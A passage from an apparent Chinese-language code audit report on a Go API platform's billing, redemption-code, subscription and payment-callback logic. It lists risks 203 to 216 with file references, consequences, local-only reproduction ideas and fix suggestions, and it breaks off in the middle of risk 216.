- 修复建议：订阅订单创建时保存完整权益快照，例如 `plan_snapshot` JSON 或显式列：`plan_title`、`price_amount`、`currency`、`total_amount`、`duration_unit/value/custom_seconds`、`upgrade_group`、`quota_reset_period/custom_seconds`、第三方 Price/Product ID。`CompleteSubscriptionOrder` 应使用订单快照创建 `UserSubscription`，只在必要时读取当前计划用于展示或兼容。`UserSubscription` 也应保存重置周期快照，`maybeResetUserSubscriptionWithPlanTx` 不应读取可变的当前 plan 来决定旧订阅重置。管理员编辑套餐时应提示“仅影响新订单/是否影响历史订阅”，并对存在 pending 订单或 active 订阅的计划做影响清单、二次确认和审计。
- 优先级：P1。
- 当前状态：未修复。

### 风险 203：订阅兑换码只保存 plan_id，未兑换的码会随套餐后续编辑改变实际发放权益

- 影响范围：订阅型兑换码、已发放未兑换的兑换码、套餐额度/时长/升级分组、兑换码审计、活动发码、客服承诺和防滥用。
- 触发条件：管理员创建或编辑 subscription 类型兑换码，绑定某个 `plan_id`；兑换码已经发给用户但尚未兑换；随后管理员修改该套餐的总额度、时长、升级分组、重置周期，或把套餐禁用/恢复；用户再兑换旧码。
- 涉及文件/函数：
  - `model/redemption.go:20-35`：`Redemption` 对订阅型兑换码只保存 `PlanId`，没有保存套餐标题、额度、时长、升级组、重置周期或计划版本快照。
  - `controller/redemption.go:91-113`：新增兑换码时只把 `Type`、`PlanId`、过期时间等字段写入每个 code；subscription 类型会把 `Quota` 清零，但不复制计划权益字段。
  - `controller/redemption.go:156-181`：编辑兑换码时同样只更新 `type/plan_id/quota/expired_time`；已发放未兑换码可以继续指向一个会被后续编辑的计划。
  - `controller/redemption.go:220-238`：订阅型兑换码的后端校验只要求 `PlanId > 0`、计划存在且标题非空；没有要求计划 `enabled=true`，也没有冻结当前计划权益。
  - `model/redemption.go:145-201`：兑换时在事务内按 `redemption.PlanId` 调用 `getSubscriptionPlanByIdTx` 读取当前套餐，并把当前计划传给 `CreateUserSubscriptionFromPlanTx`。
  - `model/subscription.go:547-606`：创建用户订阅时按当前计划计算 `AmountTotal/EndTime/NextResetTime/UpgradeGroup`，因此兑换码发放时的套餐权益不会被保留。
  - `model/redemption.go:206-213`：兑换成功后还会再次读取当前计划的 `UpgradeGroup` 更新用户 group cache，并用当前 `PlanTitle` 写日志。
- 可能后果：运营发放一批“7 天 100 万额度”的兑换码后，如果后台把该套餐改成“30 天无限额度”或更高升级组，旧兑换码会在兑换时按新权益发放；反过来，如果套餐被降级、清空升级组或改短时长，用户拿到的权益会低于活动承诺。因为兑换码记录和兑换日志只保留 `plan_id/plan_title` 这类当前引用，无法从结构化数据还原“发码时承诺的套餐权益”。禁用套餐也不一定阻止已绑定兑换码继续兑换当前计划权益，运营容易把“前台停售”误解为“兑换码也停止发放该权益”。
- 复现思路：本地创建套餐 A，`total_amount=1000`、时长 7 天、无升级组；创建 subscription 类型兑换码并记录 key；管理员把套餐 A 改为 `total_amount=0`、时长 30 天、`upgrade_group=vip`；使用旧 key 调用兑换接口。观察新建 `user_subscriptions.amount_total/end_time/upgrade_group` 是否按编辑后的计划，而不是发码时计划。再把计划禁用后重复测试，确认校验是否阻止旧码兑换。
- 修复建议：创建订阅型兑换码时保存权益快照，至少包括 `plan_title`、`total_amount`、`duration_unit/value/custom_seconds`、`upgrade_group`、`quota_reset_period/custom_seconds` 和计划版本；兑换时用兑换码快照创建 `UserSubscription`，而不是读取当前 `SubscriptionPlan`。如果希望兑换码始终跟随当前计划，应在后台明确标注“动态引用计划”，并在计划编辑时列出影响的未兑换兑换码数量、要求二次确认。禁用套餐是否影响已发放兑换码应变成明确策略：继续可兑、禁止兑换或转人工审核。
- 优先级：P1。
- 当前状态：未修复。

### 风险 204：额度型兑换码兑换直接更新 DB quota，不刷新 Redis 用户额度缓存，兑换成功后可用余额与扣费侧短时不一致

- 影响范围：额度型兑换码、用户 `quota`、Redis user cache、兑换后立即调用 API、负数/异常兑换码的人工修复、客服余额解释。
- 触发条件：Redis 用户缓存已存在；用户兑换 quota 类型兑换码；兑换码额度为正数时 DB 余额增加但 Redis 仍是旧低值，或在风险 116 的负数/异常额度场景中 DB 余额被减小但 Redis 仍是旧高值；用户在缓存刷新前发起 relay 请求或余额校验。
- 涉及文件/函数：
  - `model/redemption.go:145-201`：`Redeem` 在事务内锁定兑换码、校验状态和过期时间，quota 类型分支直接 `tx.Model(&User{}).Where("id = ?", userId).Update("quota", gorm.Expr("quota + ?", redemption.Quota))`。
  - `model/redemption.go:189-194`：额度型兑换成功后只设置返回值 `result.Quota`，没有调用 `IncreaseUserQuota`、`updateUserQuotaCache`、`InvalidateUserCache` 或事务后缓存刷新。
  - `model/redemption.go:196-200`：兑换码状态会在同一事务内改为 used 并保存，因此接口会认为兑换已经完成。
  - `model/redemption.go:215`：事务成功后只写“通过兑换码充值”日志，不包含缓存刷新或结构化资产流水。
  - `model/user_cache.go:199-203`：项目内存在单字段更新 quota cache 的 helper，但兑换路径没有使用。
  - `model/user.go:905-930`：`GetUserQuota(false)` 会优先读取 Redis quota cache；缓存命中时不会回源 DB。
  - `model/user.go:1009-1027`：常规 `IncreaseUserQuota` 至少会异步增加 cache 并写 DB，说明兑换码路径与常规加额路径不一致。
- 可能后果：用户兑换成功后，前端或 DB 查询显示已经到账，但 relay/扣费侧若读 Redis 旧 quota，可能仍按兑换前余额拒绝请求，引发“兑换成功但不能用”的客服问题。反向场景更危险：若管理员误建负数兑换码或后续通过风险 117 重新启用异常码，DB 已被扣减，但 Redis 旧高余额仍可能允许用户继续消费，直到缓存过期或被其他路径刷新。由于日志只记录文本，运营难以区分“兑换已到账但缓存未刷新”和“兑换失败”。
- 复现思路：启用 Redis，先让用户通过一次鉴权/余额读取填充 user quota cache；创建额度型兑换码并兑换；立即检查 Redis `user:<id>` 的 `Quota` 字段或发起依赖 `GetUserQuota(false)` 的请求，观察是否仍使用旧余额。再用本地测试库构造负数额度码，观察 DB quota 与 Redis quota 是否发生反向漂移。测试只在本地环境执行，不使用生产兑换码。
- 修复建议：额度型兑换码兑换应复用统一资产服务：在事务里记录兑换成功和资产流水，事务提交后可靠刷新/失效 user quota cache。最小修复是在兑换事务成功后调用 `updateUserQuotaCache` 或 `InvalidateUserCache`；更稳妥是新增 `asset_ledger`/`redemption_usages`，记录兑换前后余额、redemption id、key hash、操作者、request id，并由统一补偿任务处理缓存刷新失败。负数和极大额度仍应按风险 116 修复。
- 优先级：P1。
- 当前状态：未修复。

### 风险 207：充值余额、免费赠额、兑换、签到、人工调额和退款返还全部混入 `users.quota`，后续扣费与冲正无法区分资金来源

- 影响范围：用户主余额、充值入账、注册赠额、邀请奖励、签到奖励、额度型兑换码、管理员调额、模型调用扣费、任务扣费、退款/失败回滚、成本报表、用户争议处理。
- 触发条件：用户账号同时存在多种入账来源，例如在线充值、注册赠额、邀请码赠额、签到、兑换码、管理员手动加额、失败请求退款；随后发生模型调用扣费、任务扣费、退款、支付拒付、赠额回收、人工纠纷或运营成本核算。
- 涉及文件/函数：
  - `model/user.go:100-109`：用户表只有一个主余额 `Quota`，`TopUpMoney` 是充值金额统计字段，不是可消费余额的来源拆分；未看到 `paid_quota/free_quota/gift_quota/quota_source` 等余额桶。
  - `model/user.go:512-617`：注册时直接设置 `user.Quota = QuotaForNewUser`，邀请被邀请人奖励也调用 `IncreaseUserQuota`，赠额进入同一个 `quota`。
  - `model/topup.go:191-253`、`432-517`、`519-606`、`608-752`：Stripe、管理员补单、Creem、Waffo、Waffo Pancake 等充值成功路径均直接 `quota + quotaToAdd`，并刷新 `topup_money` 统计，但没有把充值所得与赠额分桶。
  - `model/redemption.go:145-201`：额度型兑换码兑换直接 `quota + redemption.Quota`。
  - `model/checkin.go:95-140`：签到奖励直接增加 `quota` 或调用 `IncreaseUserQuota`。
  - `model/user.go:1009-1057`：统一加减余额函数只做 `quota + ?` / `quota - ?`，参数里没有来源类型、资金桶、可撤销标记或消费优先级。
  - `service/funding_source.go:29-64`：钱包资金来源只记录 `consumed` 数字；`PreConsume/Settle/Refund` 均调用 `DecreaseUserQuota` 或 `IncreaseUserQuota`，无法知道扣的是充值余额还是免费余额。
  - `service/quota.go:406-430`：旧式 `PostConsumeQuota` 的 wallet 分支也只对用户主 `quota` 加减。
  - `controller/user.go:968-987`：管理员增加、扣减、设置余额最终仍作用在同一个 `quota` 字段。
  - 检索证据：本轮在 `model/service/controller` 中未发现可用于消费优先级和资金来源归因的 `asset_ledger`、`quota_ledger`、`source_type`、`paid_quota`、`gift_quota` 或 `free_quota` 实现。
- 可能后果：一旦用户先领取赠额再充值，或先充值再通过签到/兑换码增加余额，系统后续扣费只会减少同一个 `quota` 数字。发生退款、拒付、赠额回收或运营争议时，平台无法回答“用户已经消费的是付费额度还是免费额度”“退款应回滚多少可退余额”“某次失败请求返还的是哪类额度”。如果按总余额强行扣回，可能误扣用户已付费余额；如果不扣回，又会让已消费的赠额、兑换码或退款返还无法闭环。财务和风控报表也只能看到 `topup_money` 和当前 `quota`，无法计算付费余额沉淀、免费额度消耗、促销成本和可退金额。
- 复现思路：本地创建用户并启用注册赠额，再通过充值成功路径、额度兑换码和签到分别增加余额；随后发起一次 wallet 扣费或任务扣费，观察只减少 `users.quota`，没有记录扣费来自哪类入账。再模拟退款/拒付或人工回收赠额，检查系统是否能按来源精确扣回，或只能人工估算。测试只使用本地数据库和本地订单，不调用真实支付写入接口。
- 修复建议：把用户主余额从单一数字升级为可审计资产账本。最小方案是新增 `quota_ledger`，所有入账、扣费、退款、调额都写 `source_type/source_id/delta/balance_before/balance_after/refundable/reversible/request_id/operator_id`；中期方案是拆分 `paid_quota/free_quota/promo_quota/refund_quota` 或采用账本余额聚合视图，并明确消费优先级，例如先消耗即将过期赠额，再消耗免费额度，最后消耗付费额度。退款和拒付流程应按原充值订单关联到尚未消费的付费桶，赠额回收应只影响可回收赠额桶。后台报表需要按来源展示余额、消耗、冲正和异常差额。
- 优先级：P1。
- 当前状态：未修复。

### 风险 208：Epay 普通充值验签后不校验回调金额和商品名，支付方式不一致时还会改写本地订单后继续入账

- 影响范围：易支付普通充值、用户主余额、充值订单状态、`topup_money`、邀请充值返利、支付方式配置、运营对账和客服补单。
- 触发条件：Epay 回调签名有效且 `trade_status=TRADE_SUCCESS`，但回调中的 `money`、商品名 `name` 或支付类型 `type` 与本地 pending 订单创建时的 `Money/Amount/PaymentMethod` 不一致；可能来自支付平台后台配置错误、代理网关异常、金额/币种/商品映射漂移、人工补发通知或支付方式路由错配。
- 涉及文件/函数：
  - `controller/topup.go:228-236`：Epay 下单时向支付侧发送 `ServiceTradeNo`、商品名 `TUC<amount>` 和 `Money=strconv.FormatFloat(payMoney,'f',2,64)`。
  - `controller/topup.go:248-257`：本地 `TopUp` 保存 `Amount`、`Money`、`PaymentMethod`、`PaymentProvider=epay` 和 `Status=pending`，这些字段构成入账快照。
  - `/home/yuohira/go/pkg/mod/github.com/!calcium-!ion/go-epay@v0.0.4/epay/order.go:63-77`：SDK 的验签结果 `VerifyRes` 包含 `Type`、`TradeNo`、`ServiceTradeNo`、`Name`、`Money`、`TradeStatus` 和 `VerifyStatus`，回调金额和商品名可被读取。
  - `controller/topup.go:353-355`：控制器完成签名校验后只记录 `verifyInfo`，没有解析或比对 `verifyInfo.Money` 和 `verifyInfo.Name`。
  - `controller/topup.go:385-389`：如果本地 `PaymentMethod` 与回调 `verifyInfo.Type` 不一致，代码只是记录日志并把本地订单支付方式改成回调值，没有拒绝或转人工审核。
  - `controller/topup.go:390-418`：订单被标记 success 后，入账额度按本地 `topUp.Amount * QuotaPerUnit` 计算，日志金额使用本地 `topUp.Money`；回调 `verifyInfo.Money/Name` 不参与入账断言。
- 可能后果：只要回调签名有效且订单号命中本地 pending 订单，系统会按本地快照给用户加额度，而不是按支付侧实际回调金额和商品确认。若 Epay 端或中间支付渠道把低金额订单回调到高额度本地订单号，或回调金额因优惠、币种、小数格式、支付方式路由错误而低于本地 `Money`，用户仍可能获得本地订单对应的高额度和邀请返利。支付方式不一致时自动改写本地字段还会掩盖异常路由，事后看订单像是用实际回调方式完成，降低对账可见性。
- 复现思路：在本地测试环境创建一条 Epay pending 订单，记录本地 `Money` 和商品名 `TUC<amount>`；构造或 mock 一个验签通过的 Epay 成功回调，使 `out_trade_no` 指向该订单，但 `money` 或 `name` 与本地快照不一致，或 `type` 与 `PaymentMethod` 不一致；观察当前代码仍会把订单标 success 并按本地 `Amount` 入账。测试只使用本地 mock/测试密钥，不调用真实支付写入接口。
- 修复建议：Epay 成功回调应先做结构化支付证明校验：`verifyInfo.Money` 用 decimal 解析后与本地 `topUp.Money` 按最小货币单位比较；`verifyInfo.Name` 应匹配本地下单商品名或订单快照；`verifyInfo.Type` 必须与本地 `PaymentMethod` 一致，除非存在明确允许的支付方式替换策略并落库记录。校验失败时不要改写订单为 success，应进入 `needs_review/payment_mismatch` 状态并保存回调摘要。长期建议把 Epay 与 Stripe/Creem/Waffo/Pancake 统一到 `verified_payment_proof` 结构，所有普通充值完成函数都只接受已校验的金额、币种、产品和外部订单证明。
- 优先级：P1。
- 当前状态：未修复。

### 风险 211：管理员可把已硬删除用户的 pending 充值订单补成 success，但用户额度实际未入账

- 标题：`ManualCompleteTopUp` 先把订单标记成功，再对 `users.id = topUp.UserId` 加额度且不检查 `RowsAffected`；目标用户被硬删除时补单接口仍返回成功。
- 影响范围：管理员补单、普通充值 pending 订单、已硬删除用户的孤儿 `top_ups`、用户额度、`topup_money`、邀请充值返利、客服对账和运营收入统计。
- 触发条件：用户创建普通充值订单且 `top_ups.status='pending'`；管理员使用硬删除接口删除该用户；随后管理员在充值记录列表或通过已知 `trade_no` 调用 `/api/user/topup/complete` 补单。
- 涉及文件/函数：
  - `controller/topup.go:480-525`：管理员全量充值列表直接返回 `top_ups` 行；补单请求只提交 `trade_no`，`AdminCompleteTopUp` 调用 `model.ManualCompleteTopUp`。
  - `model/topup.go:302-329`：`GetAllTopUps` 不 join `users`，不会标识目标用户是否仍存在。
  - `model/topup.go:392-430`：`SearchAllTopUps` 只按 `trade_no LIKE` 搜索，也不会校验或展示当前用户状态。
  - `model/topup.go:480-490`：补单路径先 `Save(topUp)` 把订单设为 success，再执行 `Update("quota", quota + quotaToAdd)`，但只检查 `Error`，不检查 `RowsAffected`。
  - `model/topup.go:492-497` 与 `model/topup.go:69-130`：刷新累计充值和邀请返利在用户不存在时不会把事务变成失败；`applyInviteTopupRebateWithTx` 对缺失用户返回 nil。
  - `web/default/src/features/wallet/components/dialogs/billing-history-dialog.tsx:211-217`：default 后台只展示 `User ID` 数字，不标识该用户已被删除。
  - `web/default/src/features/wallet/components/dialogs/billing-history-dialog.tsx:322-345`：确认弹窗文案称“用户会获得对应额度”，但没有提示目标用户可能不存在。
  - `web/classic/src/components/topup/modals/TopupHistoryModal.jsx:111-127`、`220-239`：classic 后台对 pending 记录提供补单按钮，调用同一补单接口。
- 可能后果：孤儿订单会从 pending 变成 success，接口和前端提示“补单成功”，并写入管理员补单成功日志；但 `users` 表更新影响 0 行，真实用户额度没有增加，`users.topup_money` 也没有可刷新目标。订单已变 success 后无法再次走正常 pending 补单，客服会看到“已成功”的账单却找不到被加额用户，形成 paid/no-credit、误报收入、返利缺失和争议处理困难。若运营只按 success `top_ups` 统计收入，还会把未能归属到现存用户的补单计入成功收入。
- 复现思路：在本地测试库创建用户并生成一条 pending `top_ups`；调用 `DELETE /api/user/:id` 硬删除该用户；用管理员账号调用 `/api/user/topup/complete` 提交该 `trade_no`。观察接口返回 success，`top_ups.status` 和 `complete_time` 已更新，但 `UPDATE users SET quota = quota + ? WHERE id = ?` 实际没有匹配用户，且后台列表仍只显示原 `user_id`。该复现只使用本地数据，不调用真实支付渠道。
- 修复建议：补单事务内应先以 `FOR UPDATE` 或条件查询确认目标用户存在且未删除，再改变订单状态；加额度使用条件更新并要求 `RowsAffected == 1`，否则回滚并返回“目标用户不存在/已删除，禁止补单”。管理员充值列表应 join 或批量查询用户状态，显示 deleted/missing 标记并隐藏补单按钮；高风险补单继续叠加风险 21 中的二次验证、reason 和管理员维度审计。对历史孤儿 pending 订单提供只读对账/作废流程，而不是允许直接补成 success。
- 优先级：P1。
- 当前状态：未修复。

### 风险 212：订阅完成和后台绑定不校验用户存在性，可为已删除或不存在用户生成 active 订阅和 success 收入镜像

- 标题：`CreateUserSubscriptionFromPlanTx` 只校验 `userId > 0`，用户不存在时仍可创建 `user_subscriptions`；支付完成还会把 `subscription_orders` 和订阅 `top_ups` 镜像写成 success。
- 影响范围：订阅支付完成、管理员绑定套餐、管理员为指定用户创建订阅、已硬删除用户的 pending 订阅订单、`user_subscriptions`、订阅 topup 镜像、用户组升级、累计充值、客服对账和收入统计。
- 触发条件：用户创建订阅 pending 订单后被管理员硬删除，随后支付回调或 return 路径调用 `CompleteSubscriptionOrder`；或管理员直接调用 `/api/subscription/admin/bind`、`/api/subscription/admin/users/:id/subscriptions` 传入不存在或已删除的 user_id。
- 涉及文件/函数：
  - `router/api-router.go:171-181`：订阅后台计划、绑定、用户订阅创建、作废和删除均位于 `AdminAuth` 路由下。
  - `controller/subscription.go:331-346`：`AdminBindSubscription` 只校验请求里的 `user_id/plan_id` 为正数，然后调用模型层绑定。
  - `controller/subscription.go:378-394`：`AdminCreateUserSubscription` 只从 URL 取正数 userId，不确认用户存在。
  - `model/subscription.go:444-479`：购买次数限制只按 `user_subscriptions.user_id/plan_id` 计数，不校验 `users` 表存在目标用户。
  - `model/subscription.go:498-509`：`getUserGroupByIdTx` 用 `Find(&group)` 读取 `users.group`；目标用户不存在时通常返回空字符串且无错误，无法阻止后续创建。
  - `model/subscription.go:547-607`：`CreateUserSubscriptionFromPlanTx` 在用户不存在时仍会 `tx.Create(sub)`；如有升级组，`Update("group", upgradeGroup)` 也只检查 `Error`，不检查 `RowsAffected`。
  - `model/subscription.go:612-685`：`CompleteSubscriptionOrder` 完成 pending 订单时先创建订阅，再 upsert 订阅 `top_ups` 镜像，最后把订单设为 success 并刷新 `topup_money`。
  - `model/subscription.go:687-720`：订阅成功镜像会写入 `top_ups`，即使 `order.UserId` 已没有对应 `users` 主记录。
- 可能后果：订阅订单会显示支付/完成成功，并产生 active `user_subscriptions` 和 success `top_ups` 镜像，但这些权益挂在不存在的 user_id 上，真实用户无法使用；若套餐有升级组，用户组更新影响 0 行也不会中断流程。运营侧会看到订阅收入成功、套餐权益已发，但无法在用户表定位受益人，后续作废/删除订阅也只能操作孤儿订阅记录。管理员手工绑定接口还可能因误输入 user_id 给不存在账号发放套餐，制造无法登录、无法消费、但会参与统计和到期任务的假权益。
- 复现思路：本地创建用户、套餐和 pending `subscription_orders`，随后硬删除该用户；调用任一 provider 完成入口或直接调用 `CompleteSubscriptionOrder(tradeNo, ...)`，观察 `subscription_orders.status='success'`、`user_subscriptions.user_id=<deleted_id>`、`top_ups.trade_no=<tradeNo>` 均写入成功，而 `users` 表不存在该 id。另可直接用管理员接口对一个不存在的正数 user_id 绑定套餐，观察是否创建 active 订阅。该复现只使用本地数据库和本地接口，不调用真实支付。
- 修复建议：所有订阅发放入口在事务内先锁定并确认目标 `users.id` 存在且未删除；用户组升级和回退必须检查 `RowsAffected == 1`，否则回滚。`CreateUserSubscriptionFromPlanTx` 不应接受裸 userId，应接收已锁定的用户实体或显式 `EnsureActiveUserForAssetTx` 校验结果。订阅订单完成前如果发现用户已删除，应把订单转入 `manual_review/user_missing` 之类的可对账状态，而不是 success；后台绑定 UI/API 应在提交前后都显示当前用户状态，并禁止向 missing user 发放。
- 优先级：P1。
- 当前状态：未修复。

### 风险 213：视频任务终态先保存预扣 quota，再做差额结算且不回写任务 quota，任务账单长期显示预扣值

- 标题：`updateVideoSingleTask` 在任务成功时先 `UpdateWithStatus` 持久化终态和当前 `task.Quota`，随后 `RecalculateTaskQuota` 调整钱包/订阅/token、统计和账单日志，但只修改内存 `task.Quota = actualQuota`，没有把实际额度回写 `tasks.quota`
- 影响范围：通用视频/图片异步任务、Gemini/Vertex/Doubao/Kling/Vidu/Jimeng/Hailuo/Ali/Sora 等通用 task 平台、用户任务列表、管理员任务列表、客服对账、任务 quota 报表、差额补扣/退款后的资产解释
- 触发条件：任务提交时按预估额度预扣；任务完成后 adaptor `AdjustBillingOnComplete` 返回实际额度，或上游返回 `TotalTokens` 触发 `RecalculateTaskQuotaByTokens`；实际额度与预扣额度不同；任务终态 CAS 更新成功
- 涉及文件/函数：
  - `service/task_polling.go:473-499`：终态变化时先调用 `task.UpdateWithStatus(snap.Status)`，成功后才在 `shouldSettle` 分支调用 `settleTaskBillingOnComplete`
  - `service/task_polling.go:543-557`：完成后按 adaptor 实际额度或 `TotalTokens` 调用 `RecalculateTaskQuota`/`RecalculateTaskQuotaByTokens`
  - `service/task_billing.go:187-245`：`RecalculateTaskQuota` 调整资金来源、token、用户/渠道统计并写任务账单日志；第 217 行只设置内存 `task.Quota = actualQuota`，没有 DB update 或 CAS 回写
  - `relay/relay_task.go:541-558`：任务 DTO 直接返回 `task.Quota`
  - `controller/task.go:69-94`：用户和管理员任务列表通过 `TaskModel2Dto` 暴露任务行中的 quota
- 可能后果：任务真实资产已按实际额度补扣或退款，但 `tasks.quota` 仍停留在提交时预扣值。若实际额度高于预扣，任务列表和管理员页面会低估单任务成本，用户余额却已被额外扣减；若实际额度低于预扣，用户任务详情会显示更高费用，但余额或订阅已被退回差额。客服处理争议时会看到任务 quota、消费日志 delta、用户余额、token remain/used 互相不一致，运营按任务表做成本分析或导出时也会偏离真实结算。
- 复现思路：在本地构造一个非按次计费的通用视频任务，提交时 `task.Quota=5000`，轮询完成时让 adaptor 返回 `actualQuota=3000` 或让 `TotalTokens` 计算出不同额度；触发 `service.updateVideoSingleTask`。随后重新读取 `tasks.quota`、用户余额、token remain/used、任务账单日志和 `/api/task/self` 返回值。预期资产和日志体现 2000 差额，但任务 DTO 仍显示 5000。不要用真实 provider 或生产任务做验证。
- 修复建议：把终态更新和差额结算改成同一持久账务状态机：CAS 赢得终态后，在事务或 outbox 中保存 `actual_quota`、`pre_consumed_quota`、资金来源 delta、token delta 和日志状态。最小修复也应让 `RecalculateTaskQuota` 在资金和 token 调整成功后用条件更新回写 `tasks.quota = actualQuota`，并在回写失败时记录 `pending_task_billing_delta`，避免资产已调整但任务行仍是旧额度。任务 DTO 可同时暴露 `pre_consumed_quota` 和 `actual_quota`，避免历史数据混淆。
- 优先级：P1
- 当前状态：已确认活跃 `service.TaskPollingLoop` 路径存在该顺序；现有 `service/task_billing_test.go` 只断言内存 `task.Quota` 被更新，没有重新从 DB 读取任务行验证持久化 quota。

### 风险 214：日志统计接口只汇总消费日志，忽略任务退款和差额退款日志，用户/管理员统计卡片显示 gross quota

- 标题：`/api/log/stat` 和 `/api/log/self/stat` 调用的 `SumUsedQuota` 无论请求参数如何都固定 `type = LogTypeConsume`，不会抵扣 `LogTypeRefund` 任务退款/差额退款日志，导致统计 quota 不是净消费
- 影响范围：用户自助用量统计、管理员日志统计、客服对账、异步任务失败退款、任务实际额度低于预扣后的差额退款、模型/用户/渠道筛选后的消费统计、前端 usage logs 统计卡片
- 触发条件：异步任务提交时写入消费日志；随后任务失败触发 `RefundTaskQuota`，或任务完成后 `RecalculateTaskQuota(actualQuota < preConsumedQuota)` 写入退款日志；用户或管理员查看 `/api/log/self/stat`、`/api/log/stat` 的 quota 汇总
- 涉及文件/函数：
  - `controller/log.go:98-121`：管理员统计接口读取 `type/start/end/model/user/token/channel/group` 后调用 `model.SumUsedQuota`，响应只返回 `quota/rpm/tpm`
  - `controller/log.go:125-144`：用户自助统计同样调用 `model.SumUsedQuota`
  - `model/log.go:515-560`：`SumUsedQuota` 接收 `logType` 参数但没有使用该参数，最终固定 `tx.Where("type = ?", LogTypeConsume)` 和 `rpmTpmQuery.Where("type = ?", LogTypeConsume)`
  - `service/task_billing.go:152-181`：失败任务退款会写 `LogTypeRefund`，`Quota` 为退款额度
  - `service/task_billing.go:187-245`：差额结算中 `quotaDelta < 0` 时写 `LogTypeRefund`，`quotaDelta > 0` 才写 `LogTypeConsume` 并增加用户/渠道统计
  - `model/log.go:345-370`：`RecordTaskBillingLog` 确实会把退款日志写入 `logs`，不是没有退款流水，而是统计入口没有净额化使用它
- 可能后果：用户已经收到任务退款或实际费用下调，但用量统计卡片仍按最初消费日志或补扣消费日志汇总，显示高于真实净扣费的 quota；管理员按用户、模型、渠道或时间段看日志统计时也会高估消费额和渠道收入。结合风险 213，任务列表可能显示预扣值，日志统计显示 gross consume，资产余额实际已经退款，三者给出三套互相矛盾的金额，客服很难解释争议账单。
- 复现思路：本地创建一个通用任务并让提交时记录 5000 quota 消费日志；随后触发失败退款或让完成时实际额度重算为 3000，确认 `logs` 中存在 `LogTypeRefund quota=2000`。调用 `/api/log/self/stat` 或 `/api/log/stat` 查询该时间段，观察返回 quota 仍只按 `LogTypeConsume` 汇总，不会得到 3000 的净额。该复现只用本地假任务或单元测试数据，不调用真实上游。
- 修复建议：日志统计接口应明确提供 `gross_consume_quota`、`refund_quota` 和 `net_quota` 三个字段；默认面向用户和运营账单应展示净额。`SumUsedQuota` 要么按传入 `logType` 过滤，要么增加专用净额查询：`sum(CASE WHEN type=consume THEN quota WHEN type=refund THEN -quota ELSE 0 END)`，并保持 rpm/tpm 只统计请求数含义。任务退款、差额退款和未来支付冲正应统一进入可净额化的账本，而不是只作为明细列表里的普通日志。
- 优先级：P1
- 当前状态：已确认 `SumUsedQuota` 固定统计消费类型且不使用 `logType` 参数；退款日志可写入 `logs`，但统计接口不会用它抵扣。

### 风险 215：任务退款和差额结算日志不进入 `quota_data`，后台数据看板长期保留任务预扣口径

- 标题：任务提交消费日志通过 `RecordConsumeLog` 派生 `quota_data`，但任务失败退款、差额退款和差额补扣都走 `RecordTaskBillingLog`；该函数只写 `logs`，不调用 `LogQuotaData`，导致 `quota_data` 不反映任务最终净额
- 影响范围：后台数据看板、用户自助 `/api/data/self` 图表、管理员 `/api/data` 和 `/api/data/users`、`quota_data.quota/count/token_used`、任务失败退款、任务实际额度小于/大于预扣后的差额结算、运营模型成本分析
- 触发条件：通用任务提交成功时 `LogTaskConsumption` 写入消费日志并触发 `LogQuotaData`；后续任务失败退款、成功后向下重算退款或向上差额补扣；站点开启 `DataExportEnabled`；运营或用户查看数据看板
- 涉及文件/函数：
  - `model/log.go:280-329`：`RecordConsumeLog` 写 `LogTypeConsume` 后，在 `DataExportEnabled` 开启时异步调用 `LogQuotaData(userId, username, modelName, quota, ..., prompt+completion tokens)`
  - `service/task_billing.go:17-65`：任务提交确认扣费时调用 `RecordConsumeLog`，因此预扣额度会进入 `quota_data`
  - `model/log.go:333-374`：`RecordTaskBillingLog` 仅创建 `logs` 记录，没有 `DataExportEnabled` 检查，也不会调用 `LogQuotaData`
  - `service/task_billing.go:152-181`：失败任务退款写 `LogTypeRefund`
  - `service/task_billing.go:187-245`：差额结算中 `quotaDelta > 0` 写 `LogTypeConsume`、`quotaDelta < 0` 写 `LogTypeRefund`，但两者都通过 `RecordTaskBillingLog`，不会进入 `quota_data`
  - `model/usedata.go:37-65`：`LogQuotaData` 只做小时聚合并累加 `count/quota/token_used`
  - `model/usedata.go:118-137` 与 `controller/usedata.go:13-43`：后台数据看板按 `quota_data` 聚合用户、模型、时间维度的 `count/quota/token_used`
  - `model/usedata_rankings.go:21-50`：rankings 从 `quota_data.token_used` 聚合模型历史；任务日志缺少 token 数和 `LogQuotaData` 入口时，任务类使用也不会可靠进入公开热度榜
- 可能后果：任务失败后用户余额或订阅额度已退，但后台数据看板仍保留提交时的任务消费 quota；任务实际额度低于预扣时，`quota_data` 高估成本；实际额度高于预扣时，`quota_data` 低估成本，因为差额补扣日志没有进入聚合。用户自助图表、管理员用户维度图表和模型维度图表都会和资产账本、日志明细、任务列表互相矛盾。若运营用 `quota_data` 做模型成本、渠道利润或用户排行，任务类产品会长期偏离真实净收入/净消耗。
- 复现思路：本地开启 `DataExportEnabled` 和 `LogConsumeEnabled`，创建一个通用任务并让提交时记录 `quota=5000` 的消费日志，等待或手动触发 `SaveQuotaDataCache`；随后触发失败退款或实际额度重算为 3000/7000。检查 `logs` 中有退款或差额补扣日志，但 `quota_data` 仍只保留提交时的 5000，不会变为 3000 或 7000。该复现使用本地假任务或本地数据库，不调用真实 provider。
- 修复建议：不要让 `quota_data` 直接从单一消费日志入口派生。短期可让 `RecordTaskBillingLog` 对任务补扣写正向 `LogQuotaData`，对任务退款写负向 `LogQuotaData`，并明确 `count` 和 `token_used` 的净额语义；更稳妥的方案是建立统一 usage ledger，`quota_data`、rankings、日志统计和用户/渠道统计都从同一账本净额重建。对于历史数据，应提供从 `logs` 中的 consume/refund 任务流水重算 `quota_data` 的管理员任务，并标记重算范围。
- 优先级：P1
- 当前状态：已确认 `RecordTaskBillingLog` 不触发 `LogQuotaData`，任务退款和差额补扣/退款不会进入 `quota_data` 聚合；尚未补充回归测试。

### 风险 216：渠道硬删除会抹掉 `used_quota`、余额和名称上下文，历史任务/日志只剩不可解释的 channel id

- 标题：单个删除、批量删除和“删除所有禁用渠道”都会物理删除 `channels` 行；历史 `logs`、`tasks`、MJ 任务只保留 `channel_id`，渠道名称和成本累计依赖当前渠道表临时补齐，删除后运营无法还原该渠道的累计成本、余额、供应商名称和多 key 状态
- 影响范围：渠道成本报表、渠道利润率、自动禁用后的故障复盘、任务/MJ/同步调用日志、客服对账、批量清理禁用渠道、上游账单与 NewAPI 内部账单核对
- 触发条件：渠道已经产生消费、任务、退款或自动禁用记录；管理员删除单个渠道、批量删除渠道，或调用“删除所有禁用渠道”；随后运营查看渠道表、使用日志、任务列表或按上游账单追查历史成本
- 涉及文件/函数：
